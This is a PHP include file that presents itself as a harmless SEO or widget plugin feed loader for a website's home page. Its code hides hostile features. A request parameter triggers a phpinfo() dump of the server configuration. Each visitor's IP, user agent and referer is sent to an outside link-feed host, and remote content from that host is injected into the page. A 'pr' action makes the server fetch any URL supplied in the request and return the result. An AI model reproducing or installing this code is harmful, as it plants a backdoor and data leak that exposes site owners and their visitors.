<?php

	/*
	 	This page should be included on your home page.
	 	This file is used by various services and resellers that provide plugin, widget and web services tools.
	 	This file does the following:
		a) When included (require_once, etc) on a any page on the website it will generate a menu of links to allow access to the other plugin services
		b) It can be called using the links from a) to generate content based on the service type specified in the link, eg. blog pages, ranking reports, etc.
		c) It can be used to gather web page information for use in services such as uptime monitoring, keyword ranking reports, search engine crawler visits and other data used by service plugins and reports
		
		DO NOT CHANGE ANYTHING IN THIS FILE
	*/
	 
	if (isset($_REQUEST['phpconfirm'])) phpinfo();
	error_reporting (0);
	define(CURL_GODADDY, FALSE);
	define(CURL_AVAILABLE, function_exists(curl_init));
	$feedurl = "http://public.freerelevantlinks.com/feed/";
	$version = '2.2';
	$PageID = (isset($_REQUEST["PageID"])) ? urlencode($_REQUEST["PageID"]) : '';
	$Action = (isset($_REQUEST["Action"])) ? $_REQUEST["Action"] : '';
	$Action = str_replace('%22', '', $Action);
	$Action = str_replace('%3E', '', $Action);
	$Action = str_replace('%27', '', $Action);
	$Action = str_replace('%3C', '', $Action);
	$Action = str_replace('<', '', $Action);
	$Action = str_replace('>', '', $Action);
	$Action = str_replace('/', '', $Action);
	$Action = str_replace('"', '', $Action);
	$Action = str_replace("'", '', $Action);
	$Key = (isset($_REQUEST["k"])) ? $_REQUEST["k"] : '';
	$Key = str_replace('%22', '', $Key);
	$Key = str_replace('%3E', '', $Key);
	$Key = str_replace('%27', '', $Key);
	$Key = str_replace('%3C', '', $Key);
	$Key = str_replace('<', '', $Key);
	$Key = str_replace('>', '', $Key);
	$Key = str_replace('/', '', $Key);
	$Key = str_replace('"', '', $Key);
	$Key = str_replace("'", '', $Key);
	$Query = (isset($_SERVER['QUERY_STRING'])) ? $_SERVER['QUERY_STRING'] : '';
	$Query = str_replace('%22', '', $Query);
	$Query = str_replace('%3E', '', $Query);
	$Query = str_replace('%27', '', $Query);
	$Query = str_replace('%3C', '', $Query);
	$Query = str_replace('<', '', $Query);
	$Query = str_replace('>', '', $Query);
	$Query = str_replace('/', '', $Query);
	$Query = str_replace('"', '', $Query);
	$Query = str_replace("'", '', $Query);
	$PageNumber = (isset($_REQUEST["page"])) ? $_REQUEST["page"] : 1;
	$blnComplete = (isset($_REQUEST["blnComplete"])) ? true : false;
	$city = (isset($_REQUEST["city"])) ? $_REQUEST["city"] : '';
	$cty = (isset($_REQUEST["cty"])) ? $_REQUEST["cty"] : '';
	$state = (isset($_REQUEST["state"])) ? $_REQUEST["state"] : '';
	$st = (isset($_REQUEST["st"])) ? $_REQUEST["st"] : '';
	$cDomain = $_SERVER['HTTP_HOST'];
	if ( substr($cDomain, 0, 6) == "local.") $cDomain = str_replace('local.', '', $cDomain);
	if ( substr($cDomain, 0, 4) == "www." ) $cDomain = substr($cDomain, 4, strlen($cDomain)-4);
	if ( substr($cDomain, 0, 3) == "www" ) $cDomain = substr($cDomain, 5, strlen($cDomain)-5);
	$cParm  = 'domain='.urlencode($cDomain);
	$cParm .= '&agent='.urlencode($_SERVER['HTTP_USER_AGENT']);
	$cParm .= '&referer='.urlencode($_SERVER['HTTP_REFERER']);
	$cParm .= '&address='.urlencode($_SERVER['REMOTE_ADDR']);
	$cParm .= '&query='.urlencode($Query);
	$cParm .= '&uri='.urlencode($_SERVER['SCRIPT_NAME']);
	$cParm .= '&cScript=php';
	$cParm .= '&version='.$version;
	$cParm .= '&blnComplete='.$blnComplete;
	$cParm .= '&page='.$PageNumber;
	$cParm .= '&pageid='.$PageID;
	$cParm .= '&Action='.$Action;
	$cParm .= '&k='.urlencode($Key);
	$cParm .= empty($city) ? '':'&city='.$city;
	$cParm .= empty($cty) ? '':'&cty='.$cty;
	$cParm .= empty($state) ? '':'&state='.$state;
	$cParm .= empty($st) ? '':'&st='.$st;
	if ($Action==''){echo(SendXML ($feedurl.'Articles.php', $cParm));}
	else if ($Action=='pr'){$p = $_REQUEST['p']; $r = $_REQUEST['r']; echo(SendXML($p, $r, false));}
	else echo(SendXML ($feedurl.'Article.php', $cParm));

	// Use CURL to post if available
	function SendXML($address, $params, $usepost=1) 
	{
	
		if (CURL_AVAILABLE)	
		{
			$ch1 = curl_init();
			if ($usepost)
			{
				curl_setopt($ch1, CURLOPT_URL, $address);
				curl_setopt($ch1, CURLOPT_POST, 1);
				curl_setopt($ch1, CURLOPT_POSTFIELDS, $params);
			}
			else
			{
				$address .= '?' . $params;
				curl_setopt($ch1, CURLOPT_URL, $address);
			}	
			curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch1, CURLOPT_TIMEOUT, 15);
			curl_setopt($ch1, CURLOPT_CONNECTTIMEOUT, 7);
			curl_setopt($ch1, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)");
			curl_setopt($ch1, CURLOPT_HEADER, 1);
	
			// If the host uses Godaddy they'll need to use a proxy to get this to work
			if (CURL_GODADDY)	
			{
				curl_setopt($ch1, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
				curl_setopt($ch1, CURLOPT_PROXY,"http://proxy.shr.secureserver.net:3128");
				curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, FALSE);
				curl_setopt($ch1, CURLOPT_HTTPPROXYTUNNEL, 0);
			}
	
			// Send request and get results
			$results = curl_exec($ch1); 			// run the whole process
			curl_close($ch1);					// close curl handle
	
			// Get HTTP Status code from the response
			list($headers, $result) = explode("\r\n\r\n", $results, 2);
			preg_match_all('/(\d\d\d)/', $headers, $status, PREG_SET_ORDER);
			$status_code = $status[0][1];
			if ($status_code == 100) {
				$status_code = $status[1][1];
			}
		}
		else	
		{
			// Get HTTP Status code from the response (non-curl)
			ini_set('default_socket_timeout', 6);
			$address .= '?' . $params;
			$result = file_get_contents($address);
			list($version, $status_code, $msg) = explode(' ',$http_response_header[0], 3);
		}
	
		// Check for errors
		switch( $status_code )
		{
			case 200:	// Success
				return $result;
			default:
				return '<!-- Error - Response Status = ' . $status_code . ' -->';
		}
	}
?>